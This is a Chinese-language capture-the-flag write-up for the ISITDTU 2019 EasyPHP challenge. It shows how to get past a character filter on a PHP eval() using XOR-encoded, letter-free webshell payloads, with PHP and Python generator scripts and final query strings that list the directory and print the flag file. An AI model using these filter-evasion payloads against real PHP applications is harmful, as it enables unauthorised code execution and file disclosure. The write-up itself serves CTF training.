# [ISITDTU 2019]EasyPHP

## 知识点

`无字母数字webshell`

## 解题

题目给出了源码

```php
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>
```

> count_chars($string, 0x3)返回一个去重的字符串(所有使用过的不同的字符)

要求所用字符小于`13`种，还有很多检测，说明这是`无字母数字webshell`

看一下过滤了哪些字符

[参考文章](https://www.shawroot.cc/1209.html)

```php
<?php

for ($i=0; $i < 128 ; $i++) { 
	if ( !preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', chr($i)) ) {
		echo chr($i);
	}
}
```

`!#%()*+-/:;<=>?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~`

取反和异或没被过滤，测试一下`phpinfo()`

![](./img/[ISITDTU 2019]EasyPHP-1.png)

![](./img/[ISITDTU 2019]EasyPHP-2.png)

命令执行的函数都被禁用了,同时也限制了`open_basedir`在`/var/www/html`，使用`无参数rce`的`payload`

```php
print_r(scandir(.))
// 或者
print_r(glob('*.*'))
```

懒得改代码了 ，异或`php`脚本如下，[脚本](Scripts/xor_ff.php)，[参考文章](https://blog.csdn.net/weixin_45642610/article/details/119495242)

```php
<?php

#用不可见字符异或
$l = "";
$r = "";
//$argv = str_split("_GET");
$argv = str_split("phpinfo");
for($i=0;$i<count($argv);$i++)
{
    for($j=0;$j<255;$j++)
    {
        $k = chr($j)^chr(255);
        if($k == $argv[$i]){
            if($j<16){
                $l .= "%ff";
                $r .= "%0" . dechex($j);
                continue;
            }
            $l .= "%ff";
            $r .= "%" . dechex($j);
            continue;
        }
    }
}
echo "(".$l."^".$r.")";
#{%ff%ff%ff%ff^%a0%b8%ba%ab}       =_GET
#?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
?>
```

获得的`print_r(scandir(.))`的取反内容为

```php
(%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d)	// print_r
(%ff%ff%ff%ff%ff%ff%ff^%8c%9c%9e%91%9b%96%8d)	// scandir
(%ff^%d1)		// .

(%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d)((%ff%ff%ff%ff%ff%ff%ff^%8c%9c%9e%91%9b%96%8d)((%ff^%d1)))	// print_r(scandir(.))
```

发现种类有`15`种,超过`13`种，就需要把`最少出现的字符`改为`较多出现的字符`来减少字符出现的数量，除了必要的`(` `)` `^`;以外，我们最多剩余`9`个字符的空间，逐步删除`result`里的值，当结果仍能保持`11`个，就意味着我们可以继续删除了。

 [当前代码](Scripts/xor_regex.py)

[参考代码出处](https://syunaht.com/p/2441275844.html)

```python
from collections import defaultdict


def get_mini_codes():
    """获取出现最少的url编码"""
    # 给定的字符串
    input_str = "(%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d)((%ff%ff%ff%ff%ff%ff%ff^%8c%9c%9e%91%9b%96%8d)((%ff^%d1)))"
    min_arr = []
    except_min_arr = []
    # 创建一个 defaultdict 以存储每个 URL 编码的计数
    url_encoding_counts = defaultdict(int)

    # 查找所有以 '%' 开头的两个字符的组合，并计数它们的出现次数
    for i in range(len(input_str) - 2):
        if (
            input_str[i] == "%"
            and input_str[i + 1].isalnum()
            and input_str[i + 2].isalnum()
        ):
            url_encoding = input_str[i : i + 3]
            url_encoding_counts[url_encoding] += 1

    min_count = min(url_encoding_counts.values())
    min_url_encodings = [
        encoding
        for encoding, count in url_encoding_counts.items()
        if count == min_count
    ]
    print(f"出现次数最少 (出现{min_count}次) 的编码为:")
    for encoding in min_url_encodings:
        print(f"{encoding} | ", end="")
        min_arr.append(encoding)
        
    except_min_url_encodings = [encoding for encoding, count in url_encoding_counts.items() if count != min_count]
    print("\n=============================\n出现次数除了最少之外的编码为:")
    for encoding in except_min_url_encodings:
        print(f"{encoding} | ", end="")
        except_min_arr.append(encoding)

    return min_arr, except_min_arr


def en(s):
    return '%' + hex(ord(s) ^ 0xFF)[2:]

from string import ascii_letters

def get_encoded():
        res = []

        p = list(ascii_letters)
        for i in p:
                for j in p:
                        for k in p:
                                for m in p:
                                        if ord(j) ^ ord(k) ^ ord(m) == ord(i):
                                                if j == k or j == m or m == k:
                                                        continue
                                                else:
                                                        # print(i + "==" + j + "^" + k + "^" + m, end="\t")
                                                        # print(
                                                        #     '{:0>2}  =>  ["{:0>2}","{:0>2}","{:0>2}"]'.format(
                                                        #         en(i), en(j), en(k), en(m)
                                                        #     )
                                                        # )
                                                        res.append([en(i), en(j), en(k), en(m)])
                                                        break

        return res


if __name__ == "__main__":
    mini_codes, except_mini_codes = get_mini_codes()
    all_codes = mini_codes + except_mini_codes
    coded = get_encoded()
    print("\n===================")
    for arr in coded:
        # print(arr)
        # if arr[0] in mini_codes and arr[1] in except_mini_codes and arr[2] in except_mini_codes and arr[3] in except_mini_codes:
        if arr[0] in all_codes and arr[1] in all_codes and arr[2] in all_codes and arr[3] in all_codes:
            print(f"{arr[0]} ==> {arr[1]}^{arr[2]}^{arr[3]}")
            all_codes.remove(arr[0])
```

用脚本替换半天还是不行，暂时先用别人的脚本了

```python
def tail(s):
    s = list(filter(None, s.split('^')[0].strip('()').split('%')))
    p = ['ff']*len(s)
    return [p, p]


def head(s):
    s = list(filter(None, s.split('^')[0].strip('()').split('%')))
    return s


def add(l):
    s = ''
    for i in l:
        s += '%'+i
    return s


s = '(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)'
l = head(s)
p = tail(s)
to_fix_list = ['8b', '91', '8d']
to_replace = [["8c", "9b", "9c"], ["96", "9c", "9b"], ["9e", "9c", "8f"]]
for t, to_fix in enumerate(to_fix_list):
    for n, i in enumerate(l):
        if to_fix == i:
            s = s.replace(to_fix, to_replace[t][0], 1)
            p[0][n] = to_replace[t][1]
            p[1][n] = to_replace[t][2]

print("{}^({})^({})".format(s, add(p[0]), add(p[1])))
```

```
print_r=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))

scandir=((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))
```

```
?_=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));
```

读flag，用`end()`代替数组选择。

```php
show_source(end(scandir(.)));
```

```
?_=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));
```





[参考文章1](https://blog.csdn.net/mochu7777777/article/details/105786114)

[参考文章2](https://syunaht.com/p/2441275844.html)